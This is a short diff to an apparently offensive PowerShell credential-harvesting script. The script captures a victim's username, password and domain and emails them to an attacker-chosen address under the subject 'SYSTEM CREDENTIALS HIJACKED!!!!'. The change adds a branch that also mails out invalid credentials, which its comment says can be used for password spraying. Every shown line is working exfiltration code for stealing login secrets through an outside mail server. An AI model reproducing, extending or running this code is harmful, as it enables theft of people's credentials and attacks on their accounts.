@@ -34,13 +34,20 @@ Param ()
             if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
             {
                 $local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
-		# SEND SECOND EMAIL CONTAINING SYSTEM CREDENTIALS
+		# SEND SECOND EMAIL CONTAINING VALID SYSTEM CREDENTIALS
 
 		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
 		$newline = "`r`n"
 		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
                 break
             }
+	    else{
+	    	$local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
+		# SEND EMAIL CONTAINING INVALID SYSTEM CREDENTIALS , CAN BE USED FOR PASSWORD SPRAYING
+
+		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+		$newline = "`r`n"
+		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
         }
     }
 }
